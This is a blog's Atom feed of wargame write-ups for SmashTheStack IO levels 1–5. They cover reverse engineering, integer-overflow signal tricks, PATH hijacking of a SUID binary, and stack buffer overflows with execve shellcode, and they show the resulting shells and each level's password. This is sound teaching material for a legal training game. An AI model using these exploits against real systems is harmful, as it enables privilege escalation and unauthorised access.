<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: smashthestack | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/smashthestack/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-08-24T07:23:56-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 5]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5/"/>
    <updated>2014-07-18T13:08:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5</id>
    <content type="html"><![CDATA[<p>This is another level with 2 alternate programs to exploit.</p>

<!-- more -->


<p>Code for level05.c:</p>

<p>``` c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char **argv) {</p>

<pre><code>char buf[128];

if(argc &lt; 2) return 1;

strcpy(buf, argv[1]);

printf("%s\n", buf);    

return 0;
</code></pre>

<p>}
```</p>

<p>This is a simple buffer overflow program. I will use the <a href="http://www.shell-storm.org/shellcode/files/shellcode-811.php">x86 execve(&ldquo;/bin/sh&rdquo;)</a> shellcode and place it in an environment variable. Then I will get the address of that variable using an excellent program from Hacking: The Art of Exploitation and pass it to the level5 binary in order to get a shell.</p>

<p>First, here is the very useful code for getting the address of an environment variable, from Jon Erickson&rsquo;s book:</p>

<p>``` c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char *argv[]) {</p>

<pre><code>    char *ptr;
    if(argc &lt; 3) {
            printf("Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n", argv[0]);
            exit(0);
    }
    ptr = getenv(argv[1]); /* Get env var location. */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
    printf("%s will be at %p\n", argv[1], ptr);
</code></pre>

<p>}
```</p>

<p>Compile this program in your own directory. Next, add an environment variable with the shellcode:</p>

<p><code>plain
export PWN=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
</code></p>

<p>Next we need to find out the offsets for exploiting the program (again pattern_create.rb and pattern_offset.rb are your friends):</p>

<p><code>plain
root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</code></p>

<p>Run the program in GDB with the pattern and then get the offset:</p>

<p>``` plain
Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()</p>

<p>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 0x37654136
[*] Exact match at offset 140
```</p>

<p>Now get the address of our environment variable:</p>

<p><code>plain
level5@io:/tmp/mydir$ ./getenv PWN /levels/level05
PWN will be at 0xbfffff53
</code></p>

<p>Profit:</p>

<p><code>plain
level5@io:/tmp/mydir$ /levels/level05 $(python -c 'print "A" * 140 + "\x53\xff\xff\xbf"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS���
sh-4.2$ whoami
level6
sh-4.2$ cat /home/level6/.pass
9BT8fmYDTPimXXhY3m
</code></p>

<p>This was the easy way. Prepare for worse in the alternate way, with level05_alt.c:</p>

<p>``` c
//don&rsquo;t get trapped, there&rsquo;s no need
//level by bla</p>

<h1>include &lt;sys/mman.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<h1>define LOADERSIZE (232 + 16)</h1>

<p>void<em> getASLRregion(int size, int flags);
void switchcontext(char</em> newstack, char* code);</p>

<p>int main(int argc, char<em> argv[], char</em> env[])
{</p>

<pre><code>char *newcode, *newstack;

//allocate memory at random addresses
newstack = getASLRregion(64 * 1024, PROT_READ | PROT_WRITE );
newcode =  getASLRregion(64 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC);

if(argc &gt; 1)
if(!strchr(argv[1], 0xcd))
if(!strchr(argv[1], 0xe8))
if(!strstr(argv[1], "\x0F\x34"))
if(!strchr(argv[1], 0xdb)) {
    //prepare new code section, leaving some space for a loader
    strncpy(newcode + LOADERSIZE, argv[1], 1000);

    //start executing using a new stack and code section.
    switchcontext(newstack + 64 * 1024, newcode);
}
return 0;
</code></pre>

<p>}</p>

<p>/<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>/
/</em> HALT! The code below only provides a controllable aslr/noexec for this challenge, there&rsquo;s no need to waste time on it <em>/
/</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>/
void <strong>attribute</strong>((constructor))initializePRNG(){int seed;FILE<em>devrand=fopen(&ldquo;/dev/random&rdquo;,&ldquo;r&rdquo;);if(devrand==0)exit(-1);
if(fread(&amp;seed, 4, 1, devrand) != 1)exit(-1);fclose(devrand);srand(seed);}unsigned int loader[100]={0xe899c031,0};void</em>
getASLRregion(int size, int flags){int tries=1000,hint,res;while(tries&mdash;){hint=rand()&lt;&lt;12;res=(int)mmap((void<em>)hint,size
+4096,flags,MAP_PRIVATE|MAP_ANONYMOUS,0,0);if(hint==res){loader[++loader[1]+1]=hint;return (void</em>)(res+(rand()&amp;0xffc));}
if(munmap((void<em>)res,size+4096))exit(-1);}exit(-1);}void switchcontext(char</em>newstack,char<em>code){loader[1]&lt;&lt;=2;memcpy(code
,loader,loader[1]+8);memcpy(code+loader[1]+8,&ldquo;\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70&rdquo;
&ldquo;\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31&rdquo;
&ldquo;\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30&rdquo;
&ldquo;\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff&rdquo;
&ldquo;\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2&rdquo;
&ldquo;\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80&rdquo;
&ldquo;\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80&rdquo;
&ldquo;\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6&rdquo;
&ldquo;\xf3\xab\x31\xff&rdquo;,LOADERSIZE-16);asm(&ldquo;mov %0, %%esp\nmov %1,%%eax\njmp </em>%%eax&rdquo;::&ldquo;r&rdquo;(newstack-4),&ldquo;r&rdquo;(code):&ldquo;eax&rdquo;);}
```</p>

<h4>Function overview</h4>

<p>Well, let&rsquo;s first be clear on the flags used for the memory allocation:</p>

<p>PROT_EXEC  Pages may be executed.</p>

<p>PROT_READ  Pages may be read.</p>

<p>PROT_WRITE Pages may be written.</p>

<p><strong>strchr</strong></p>

<p><em>char <em>strchr(const char </em>str, int ch);</em></p>

<p>Returns a pointer to the first occurrence of character ch in str or a null pointer if no matching character is found.</p>

<p>The terminating null byte is considered part of the string, so that if  ch  is  specified  as &lsquo;\0&rsquo;, this function returns a pointer to the terminator.</p>

<p>I will come back to this at a later time.</p>

<blockquote><p>Truth is the most valuable thing we have &mdash; so let us economize it.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 4]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/"/>
    <updated>2014-07-07T15:24:52-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4</id>
    <content type="html"><![CDATA[<p>We have source code for this level as well in level04.c:</p>

<!-- more -->


<p>``` c
//writen by bla</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main() {</p>

<pre><code>    char username[1024];
    FILE* f = popen("whoami","r");
    fgets(username, sizeof(username), f);
    printf("Welcome %s", username);

    return 0;
</code></pre>

<p>}
```</p>

<h4>Function overview</h4>

<p><strong>popen</strong></p>

<p><em>FILE <em>popen(const char </em>command, const char *type);</em></p>

<p>Opens a process by creating a pipe,  forking,  and invoking  the shell.  Since a pipe is by definition unidirectional, the type argument may specify  only  reading  or  writing,  not  both;  the resulting stream is correspondingly read-only or write-only.</p>

<p>The  command argument is a pointer to a null-terminated string containing a shell command line.  This command is passed to /bin/sh using  the -c  flag;  interpretation, if any, is performed by the shell.  The type argument is a pointer to a null-terminated string  which  must  contain either the letter &lsquo;r&rsquo; for reading or the letter &lsquo;w&rsquo; for writing.  Since glibc 2.9, this argument can additionally include the letter &lsquo;e&rsquo;, which causes  the close-on-exec flag (FD_CLOEXEC) to be set on the underlying file descriptor.</p>

<p>The  return  value  from popen() is a normal standard I/O stream in all respects save  that  it  must  be  closed  with  pclose()  rather  than <em>fclose(3)</em>.   Writing  to  such a stream writes to the standard input of the command; the command&rsquo;s standard output is the same as that  of  the process  that  called  popen(),  unless  this is altered by the command itself.  Conversely, reading from a &ldquo;popened&rdquo;  stream  reads  the  command&rsquo;s standard output, and the command&rsquo;s standard input is the same as that of the process that called popen().</p>

<p>Note that output popen() streams are fully buffered by default.</p>

<p>The popen() function returns NULL if the <em>fork(2)</em> or <em>pipe(2)</em> calls fail, or if it cannot allocate memory.</p>

<p>The popen() function does not set errno if memory allocation fails.  If the underlying fork(2) or pipe(2) fails, errno  is  set  appropriately. If  the type argument is invalid, and this condition is detected, errno is set to EINVAL.</p>

<p>Since the standard input of a command opened  for  reading  shares  its seek  offset  with  the  process  that  called popen(), if the original process has done a buffered read, the command&rsquo;s input position may  not be  as expected.  Similarly, the output from a command opened for writing may become intermingled with that of  the  original  process.   The latter can be avoided by calling fflush(3) before popen().</p>

<p>Failure  to  execute  the  shell  is indistinguishable from the shell&rsquo;s failure to execute command, or an immediate exit of the  command.   The only hint is an exit status of 127.</p>

<p><strong>fgets</strong></p>

<p><em>char <em>fgets(char </em>str, int num, FILE *stream);</em></p>

<p>The <em>fgets()</em> function reads up to <em>num–1</em> characters from <em>stream</em> and stores them in the character array pointed to by <em>str</em>. Characters are read until either a newline or an EOF is received or until the specified limit is reached. After the characters have been read, a null is stored in the array immediately after the last character read. A newline character will be retained and will be part of the array pointed to by <em>str</em>.</p>

<p>On success, the function returns <em>str</em>.
If the end-of-file is encountered while attempting to read a character, the eof indicator is set (<em>feof</em>). If this happens before any characters could be read, the pointer returned is a null pointer (and the contents of <em>str</em> remain unchanged).
If a read error occurs, the error indicator (<em>ferror</em>) is set and a null pointer is also returned (but the contents pointed by <em>str</em> may have changed).</p>

<h4>Program description</h4>

<p>This program executes a shell command and prints the results. If we try to run it, we see this:</p>

<p><code>plain
level4@io:/levels$ ./level04
Welcome level5
</code></p>

<p>This makes sense, since it&rsquo;s a SUID binary owned by the level5 user. What we want to do is substitue the command called by popen with one that will help us advance, like <code>cat /home/level5/.pass</code></p>

<p>We can&rsquo;t directly influence the program since it doesn&rsquo;t take user input. But we know that the change must occur in the popen line. So in that line, it opens a pipe for reading to the <em>whoami</em> command. We can&rsquo;t put another command its place, but maybe we don&rsquo;t have to. How does the program know where to find whoami? Let&rsquo;s first find it ourselves:</p>

<p><code>plain
level4@io:/levels$ which whoami
/usr/bin/whoami
</code></p>

<p>For this we have to understand the concept of PATH:</p>

<blockquote><p>PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for
executable files in response to commands issued by a user.
Each user on a system can have a different PATH variable.</p>

<p>(The Linux Information Project)</p></blockquote>

<p>To see the contents of our PATH variable, we do this:</p>

<p><code>plain
level4@io:/levels$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>So this is how the program knew how to find whoami. It just searched those directories until it found it. And we know we can add a new directory to our default search path with one of the below commands:</p>

<p>``` plain
PATH=&ldquo;directory:$PATH&rdquo;</p>

<p>PATH=$PATH:directory
export PATH</p>

<p>export PATH=$PATH:directory
```</p>

<p>Now we should get an idea of the steps to exploit the program. We can create our own directory and store in it a program named whoami that would do what we want it to. Then should add that directory to our path, and then level04 program searches for whoami, it will hit upon our own whoami version instead. Let&rsquo;s do that now.</p>

<p><code>plain
level4@io:/levels$ mkdir /tmp/mydir
level4@io:/tmp/mydir$ echo "cat /home/level5/.pass" &gt; /tmp/mydir/whoami
level4@io:/tmp/mydir$ ls -l whoami
-rw-r--r-- 1 level4 level4 23 Jul 17 17:44 whoami
</code></p>

<p>If we leave it like this, the permissions won&rsquo;t allow it to be executed, so I make it readable, writable and executable for everyone with the following:</p>

<p><code>plain
chmod 777 whoami
level4@io:/tmp/mydir$ ls -l whoami
-rwxrwxrwx 1 level4 level4 23 Jul 17 17:44 whoami
</code></p>

<p>Now add our directory to our PATH:</p>

<p><code>plain
level4@io:/tmp/mydir$ PATH="/tmp/mydir:$PATH"
level4@io:/tmp/mydir$ echo $PATH
/tmp/mydir:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>All that&rsquo;s left is to run the level04 binary and collect the password:</p>

<p><code>plain
level4@io:/tmp/mydir$ /levels/level04
Welcome KGpWsju2vDpmxcxlvm
</code></p>

<blockquote><p>Work consists of whatever a body is obliged to do.
Play consists of whatever a body is not obliged to do.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 3]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3/"/>
    <updated>2014-07-07T14:37:07-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3</id>
    <content type="html"><![CDATA[<p>This is the source code for level03.c:</p>

<!-- more -->


<p>``` c
//bla, based on work by beach</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void good()
{</p>

<pre><code>    puts("Win.");
    execl("/bin/sh", "sh", NULL);
</code></pre>

<p>}
void bad()
{</p>

<pre><code>    printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
</code></pre>

<p>}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{</p>

<pre><code>    void (*functionpointer)(void) = bad;
    char buffer[50];

    if(argc != 2 || strlen(argv[1]) &lt; 4)
            return 0;

    memcpy(buffer, argv[1], strlen(argv[1]));
    memset(buffer, 0, strlen(argv[1]) - 4);

    printf("This is exciting we're going to %p\n", functionpointer);
    functionpointer();

    return 0;
</code></pre>

<p>}
```</p>

<h4>Function overview</h4>

<p><strong>memcpy</strong></p>

<p><em>void <em>memcpy(void </em>dest, const void *src, size_t n);</em></p>

<p>Copies  <em>n</em> bytes from memory area <em>src</em> to memory area <em>dest</em>. The memory areas must not overlap.</p>

<p>The function does not check for any terminating null character in <em>src</em>.</p>

<p>Returns a pointer to <em>dest</em>.</p>

<p><strong>memset</strong></p>

<p><em>void <em>memset(void </em>buf, int value, size_t count);</em></p>

<p><em>buf</em> = Pointer to the block of memory to fill.</p>

<p><em>value</em> = Value to be set. The value is passed as an int, but the function fills the block of memory using the unsigned char conversion of this value.</p>

<p><em>count</em> = Number of bytes to be set to the value.</p>

<p>Sets the first <em>count</em> bytes of the block of memory pointed by <em>buf</em> to the specified <em>value</em></p>

<p>Returns a pointer to the memory area <em>buf</em></p>

<p>The most common use of <em>memset()</em> is to initialize a region of memory to some known value.</p>

<h4>Program description</h4>

<p>Running the program we see this:</p>

<p><code>plain
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
</code></p>

<p>So we know the bad function address is at 0x80484a4 and the good function address is at 0x8048474. A function pointer is set to point to the address of the bad function. The program checks for an argument that is at least 4 in length. Then memset sets all except the last 4 bytes of the buffer to 0. There is a buffer overflow in how the program copies the argument to the buffer, without checking for boundaries. This will be key in exploiting the binary.</p>

<p>I proceeded through feeding a string to the program that I created with <code>pattern_create.rb</code>. Then I ran the program with GDB:</p>

<p><code>plain
Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
</code></p>

<p>So EIP points to some junk that I provided with the string. Let&rsquo;s check the offset:</p>

<p><code>plain
./pattern_offset.rb 0x63413563
[*] Exact match at offset 76
</code></p>

<p>Excellent! Since we already have the address we need for the good function that will spawn us a shell, the next step is simple:</p>

<p><code>plain
level3@io:/levels$ ./level03 $(python -c 'print "A" * 76 + "\x74\x84\x04\x08"')
This is exciting we're going to 0x8048474
Win.
sh-4.2$ whoami
level4
sh-4.2$ cat /home/level4/.pass
9C4Jxjc3O3IjB7nXej
</code></p>

<p>We hijacked the execution flow and made EIP point to the address of the function we needed.</p>

<blockquote><p>The surest protection against temptation is cowardice.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-2/"/>
    <updated>2014-07-03T16:51:49-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-2</id>
    <content type="html"><![CDATA[<p>For level 2, there are two programs that can be used to advance, and we have access to source code! Let&rsquo;s check the first one.</p>

<!-- more -->


<p>The source code for level02.c is as follows:</p>

<p>``` c
//a little fun brought to you by bla</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;signal.h></h1>

<h1>include &lt;setjmp.h></h1>

<p>void catcher(int a)
{</p>

<pre><code>    setresuid(geteuid(),geteuid(),geteuid());
printf("WIN!\n");
    system("/bin/sh");
    exit(0);
</code></pre>

<p>}</p>

<p>int main(int argc, char **argv)
{</p>

<pre><code>puts("source code is available in level02.c\n");

    if (argc != 3 || !atoi(argv[2]))
            return 1;
    signal(SIGFPE, catcher);
    return abs(atoi(argv[1])) / atoi(argv[2]);
</code></pre>

<p>}
```</p>

<h4>Function overview</h4>

<p><strong>atoi</strong></p>

<p><em>int atoi(const char *str);</em></p>

<p>Converts the string argument to an integer. The string must contain a valid integer number. If this is not the case, the returned value is undefined.</p>

<p>The number can be terminated by any character that cannot be part of an integer number. This includes white space, punctuation, and characters.</p>

<p>Returns 0 if the string can&rsquo;t be converted to a valid integer.</p>

<p><strong>abs</strong></p>

<p><em>int abs (int n);</em></p>

<p>Returns the absolute value of an integer.</p>

<p>Trying to take the absolute value of the most negative integer is not defined.</p>

<p><strong>signal</strong></p>

<p><em>typedef void (*sighandler_t)(int);</em></p>

<p><em>sighandler_t signal(int signum, sighandler_t handler);</em></p>

<p>Sets a function as a handler for the signal. That function will be called when the program receives the signal.</p>

<p>The function can be a specific function or one of the following macros:</p>

<p><strong>SIG_DFL</strong> Default signal handling: the default action associated with the signal occurs.</p>

<p><strong>SIG_IGN</strong> Ignore the signal</p>

<p>According  to  POSIX, the behavior of a process is undefined after it ignores a SIGFPE, SIGILL, or SIGSEGV signal that was not generated by kill(2) or raise(3).  Integer division by zero has undefined result.  On some architectures it will  generate  a  SIGFPE signal.  (Also dividing the most negative integer by -1 may generate SIGFPE.)  Ignoring this signal might lead to an endless loop.</p>

<p>The effects of signal() in a multithreaded process are unspecified.</p>

<p><strong>SIGFPE</strong>      (Signal Floating-Point Exception) Erroneous arithmetic operation, such as zero divide or an operation resulting in overflow (not necessarily with a floating-point operation).</p>

<h4>Program description</h4>

<p>We can see from the code that the program is looking for 2 arguments, with the second being a valid <em>atoi</em> converted integer, and it returns the absolute value of the result of the division between the first and second arguments. The <em>catcher</em> function is registered as handler for the SIGFPE signal, and we want it to get called. At first glance, this should be possible by doing a zero division. But we can&rsquo;t use 0 for our second argument, because the program checks for <em>atoi</em> returning 0.</p>

<p>From the man page, we know that SIGFPE may be generated if we divide the most negative integer by -1, so let&rsquo;s try that:</p>

<p>``` plain
level2@io:/levels$ ./level02 -2147483648 -1
source code is available in level02.c</p>

<p>WIN!
sh-4.2$ cat /home/level3/.pass
Ib3F7i7FqjziuDOBKi
```</p>

<p>It worked! Now let&rsquo;s look at the alternate way. This is the source for level02_alt.c:</p>

<p>``` c
/<em> submitted by noname </em>/</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>define answer 3.141593</h1>

<p>void main(int argc, char **argv) {</p>

<pre><code>float a = (argc - 2)?: strtod(argv[1], 0);

    printf("You provided the number %f which is too ", a);


    if(a &lt; answer)
             puts("low");
    else if(a &gt; answer)
            puts("high");
    else
            execl("/bin/sh", "sh", "-p", NULL);
</code></pre>

<p>}
```</p>

<h4>Function overview</h4>

<p><strong>strtod</strong></p>

<p><em>double strtod(const char *str, char **endptr);</em></p>

<p>Converts the string to double and returns the result. Any character that cannot be part of a floating-point number will end the parsing. A pointer to the rest of the string after the last valid character is stored in the object pointed by <em>endptr</em>. If no conversion is performed, 0 is returned and the value of <em>str</em> is stored in the location referenced by <em>endptr</em>.</p>

<h4>Program description</h4>

<p>The program will spawn a shell if we provide it with the exact match for answer. But it&rsquo;s not as straightforward as passing 3.141593 to it, when I did that, I got the message that it was too low. I added a printf to the code, and I couldn&rsquo;t see any difference in rounding, but since this is a no-go, there has to be something else. Looking more closely at the manpage:</p>

<blockquote><p>The expected form of the (initial portion of the) string is optional
leading white space as recognized by isspace(3), an optional plus (&lsquo;+&rsquo;)
or minus sign (&lsquo;&ndash;&rsquo;) and then either (i) a decimal number, or (ii) a
hexadecimal number, or (iii) an infinity, or (iv) a NAN (not-a-number).</p>

<p>A NAN is &ldquo;NAN&rdquo; (disregarding case) optionally followed by &lsquo;(&rsquo;, a
sequence of characters, followed by &lsquo;)&rsquo;.  The character string specifies in an implementation-dependent way the type of NAN.</p></blockquote>

<p>Passing it nan gives us the shell:</p>

<p><code>plain
level2@io:/levels$ ./level02_alt nan
sh-4.2$ whoami
level3
</code></p>

<p>Cookie:</p>

<blockquote><p>Your temporary financial embarrassment will be relieved in a surprising manner.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 1]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-1/"/>
    <updated>2014-07-03T12:24:36-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/03/smashthestack-io-level-1</id>
    <content type="html"><![CDATA[<p>There are different wargames hosted on <a href="http://smashthestack.org/">http://smashthestack.org/</a> , with IO being the most popular of them. The missions revolve around debugging and reversing binaries in order to exploit some software vulnerabilities and gain enough privileges to read the password for the next level.</p>

<!-- more -->


<p>To connect to the first level, you have to SSH to the box with the password of <strong>level1</strong>:</p>

<p><code>plain
ssh level1@io.smashthestack.org
</code></p>

<p>If you are new to these wargames, read the README file, which has some additional explanations. Levels for this game can be found in <code>/levels</code> and passwords are located in the level&rsquo;s home directory, like <code>/home/level2/.pass</code></p>

<p>So, when trying to run the <em>level01</em> binary, we can see it&rsquo;s looking for a passcode:</p>

<p><code>plain
level1@io:/levels$ ./level01
Enter the 3 digit passcode to enter:
</code></p>

<p>Let&rsquo;s see what&rsquo;s going on using GDB. This is the disassembly of the main() function for this program:</p>

<p><code>plain
(gdb) disas main
Dump of assembler code for function main:
   0x08048080 &lt;+0&gt;:     push   $0x8049128
   0x08048085 &lt;+5&gt;:     call   0x804810f &lt;puts&gt;
   0x0804808a &lt;+10&gt;:    call   0x804809f &lt;fscanf&gt;
   0x0804808f &lt;+15&gt;:    cmp    $0x10f,%eax
   0x08048094 &lt;+20&gt;:    je     0x80480dc &lt;YouWin&gt;
   0x0804809a &lt;+26&gt;:    call   0x8048103 &lt;exit&gt;
End of assembler dump.
</code></p>

<p>This line is interesting:</p>

<p><strong>cmp    $0x10f,%eax</strong></p>

<p>So there is a comparison between a constant and <em>eax</em>, and if they&rsquo;re equal, it means that we&rsquo;re right on the password. Let&rsquo;s check that constant:</p>

<p><code>plain
(gdb) p 0x10f
$2 = 271
</code></p>

<p>This makes sense, 0x10f is the hex representation of 271 in decimal. And we know the program is looking for a 3-digit passcode. Let&rsquo;s try it:</p>

<p><code>plain
level1@io:/levels$ ./level01
Enter the 3 digit passcode to enter: 271
Congrats you found it, now read the password for level2 from /home/level2/.pass
sh-4.2$ cat /home/level2/.pass
hgvbmkQIHavkGg5wyk
</code></p>

<p>Ok, this was an easy level!</p>

<blockquote><p>Q:    How many hardware engineers does it take to change a light bulb?
A:    None.  We&rsquo;ll fix it in software.</p>

<p>Q:    How many system programmers does it take to change a light bulb?
A:    None.  The application can work around it.</p>

<p>Q:    How many software engineers does it take to change a light bulb?
A:    None.  We&rsquo;ll document it in the manual.</p>

<p>Q:    How many tech writers does it take to change a light bulb?
A:    None.  The user can figure it out.</p></blockquote>
]]></content>
  </entry>
  
</feed>
